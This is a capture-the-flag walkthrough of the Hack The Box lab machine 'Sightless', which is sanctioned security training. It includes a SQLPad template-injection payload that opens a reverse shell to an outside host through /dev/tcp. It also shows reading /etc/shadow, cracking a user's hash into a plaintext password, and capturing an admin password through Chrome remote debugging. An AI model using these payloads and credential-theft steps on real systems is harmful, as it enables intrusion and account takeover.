# Sightless

<figure><img src="../../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>



## Port scan

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 07:24 IST
Nmap scan report for sightless.htb (10.129.93.120)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.93.120]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Sightless.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=9/8%Time=66DD03EF%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,A2,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20S
SF:erver\)\x20\[::ffff:10\.129\.93\.120\]\r\n500\x20Invalid\x20command:\x2
SF:0try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\
SF:x20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.44 seconds
```

Adding `sightless.htb` in `/etc/hosts`

## Subdomain/vHost

Found another subdomain under webpage (ctrl+u : ctrl+f .htb)

{% embed url="http://sqlpad.sightless.htb/" %}

## Web vuln (RCE - Template injection)

After a quick google search, I found:

{% embed url="https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb" %}

<figure><img src="../../../.gitbook/assets/image (177).png" alt=""><figcaption><p>After entering the payload, click on Test</p></figcaption></figure>

```bash
{{ process.mainModule.require( 'child_process' ). exec ( 'bash -c "bash -i >& /dev/tcp/10.10.16.63/4444 0>&1"' ) }} 
```

Root?

```bash
root@c184118df0a6:/var/lib/sqlpad# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## User shell

We are in a docker container (ofc)

```bash
root@c184118df0a6:/var/lib/sqlpad# ls -la /
ls -la /
total 92
drwxr-xr-x   1 root root 4096 Sep 12 17:15 .
drwxr-xr-x   1 root root 4096 Sep 12 17:15 ..
-rwxr-xr-x   1 root root    0 Aug  2 09:30 .dockerenv
drwxr-xr-x   2 root root 4096 Feb 28  2022 bin
drwxr-xr-x   2 root root 4096 Oct  3  2021 boot
drwxr-xr-x   5 root root  340 Sep 12 15:59 dev
-rwxr-xr-x   1 root root  413 Mar 12  2022 docker-entrypoint
```

There's this .sqlite file in current directory `sqlpad.sqlite` which i tried in few ways to bring in my local machine I failed(if you know any way, please let me know on discord: heapbytes)

So just to see how many users are on system, i looked out in /etc/passwd file and found 3 users with shell (tty)

Since we are root, we can read `/etc/shadow`&#x20;

```bash
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

And we found a hash, let's try cracking it with john/hashcat

```bash
╰─➤  john --wordlist=/usr/share/wordlists/rockyou.txt user.micheal.hash 
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
insaneclownposse (michael)     
1g 0:00:00:06 DONE (2024-09-12 23:10) 0.1562g/s 9280p/s 9280c/s 9280C/s Whitney..062699
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Great, let's `ssh` into the box.

```bash
michael@sightless:~$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael)
```

## Root shell

Since we aren't in sudoers' list, we can try with other recon.

I ran linpeas and saw something unusual

```bash
/opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.GAeyhA data:,

/opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=1730 --no-sandbox --disable-dev-shm-usage --enable-automation --remote-debugging-port=0 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1726286845035690 --launc
```

There was this google chrome running in headless mode,&#x20;

Then I looked for ports that are opened internally with `netstat -tunlp`

There were few ports opened, which I port forwarded.\
Note: the `admin.sightless.htb` was running on port 8080 (domain found through linpeas results)

<figure><img src="../../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

Since this was chrome headless mode, upon googling, you fill find this blog of `Google`\
After scrolling a bit we can see a debug feature,&#x20;

{% embed url="https://developer.chrome.com/docs/chromium/headless#debug" %}

Adding all the ports, (e.g 127.0.0.1:34931) in `Configure` we can see Froxlor, click on `inspect` .

<figure><img src="../../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

It will show us details of app running, I tried with **cookie hijacking**, but the admin cookie usually changes here after each login. If we click on `Networks` tab, we can see the password in clear text since this is a HTTP website.

<figure><img src="../../../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

Login as `admin`

There are many features available, the one we are interested is `php-fpm`

```
PHP-FPM, or “PHP FastCGI Process Manager,” is an advanced, 
high-performance FastCGI process manager for PHP. 
It resolves the concurrency issue of PHP's built-in server by spawning multiple workers, 
which can handle multiple requests simultaneously
```

<figure><img src="../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

So we can create a new fpm version, so in `php-fpm restart command`, we can add our own custom command.

Once done, scroll and click save.

Later we can go in settings, and `re-enable` our php-fpm, \


1. Disable the option.
2. Click on Save
3. Enable the option.
4. Click on save

This will start all the `fpm` versions, and our custom command will run this time.

<figure><img src="../../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

Done. We are now root.

<figure><img src="../../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

\_\_\_\_\_\_\_\_heapbytes' still pwning.
